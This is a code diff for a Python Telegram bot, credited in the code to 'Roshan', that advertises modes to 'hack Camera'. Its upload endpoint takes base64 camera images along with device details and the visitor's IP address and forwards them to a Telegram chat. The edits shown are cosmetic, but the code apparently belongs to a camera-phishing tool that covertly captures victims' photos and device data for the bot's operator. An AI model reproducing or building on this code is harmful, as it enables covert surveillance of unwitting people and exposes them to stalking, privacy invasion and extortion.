@@ -65,7 +65,7 @@ def callback_query(call):
         markup.row(btn1, btn2)
         markup.row(types.InlineKeyboardButton("📸 Dual Camera", callback_data="m_dual"))
         markup.row(types.InlineKeyboardButton("🧑‍💻 Contact Support", url="tg://user?id=518067190"))
-        bot.edit_message_text("<b>🤠 Select your camera mode to hack Camera 📸:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
+        bot.edit_message_text("<b>Select your camera mode to hack Camera 📸:</b>", call.message.chat.id, call.message.message_id, parse_mode='HTML', reply_markup=markup)
 
     elif "m_" in call.data:
         mode = call.data.replace("m_", "")
@@ -89,10 +89,10 @@ def upload():
     try:
         img_data = base64.b64decode(data.get('image').split(',')[1])
         info = data.get('info', {})
-        caption = (f"🛡️ <b>Audit:</b> {data.get('mode').upper()}\n"
-                   f"🔋 <b>Battery:</b> {info.get('battery')}\n"
-                   f"🌐 <b>Browser:</b> {info.get('browser')}\n"
-                   f"📱 <b>Device:</b> {info.get('platform')}\n"
+        caption = (f"🛡️ <b>Audit:</b> {data.get('mode', 'N/A').upper()}\n"
+                   f"🔋 <b>Battery:</b> {info.get('battery', 'N/A')}\n"
+                   f"🌐 <b>Browser:</b> {info.get('browser', 'N/A')}\n"
+                   f"📱 <b>Device:</b> {info.get('device', 'N/A')}\n"
                    f"📍 <b>IP:</b> {request.remote_addr}\n\n"
                    f"✨ Created by Roshan ✨")
         bot.send_photo(data.get('uid'), img_data, caption=caption, parse_mode='HTML')
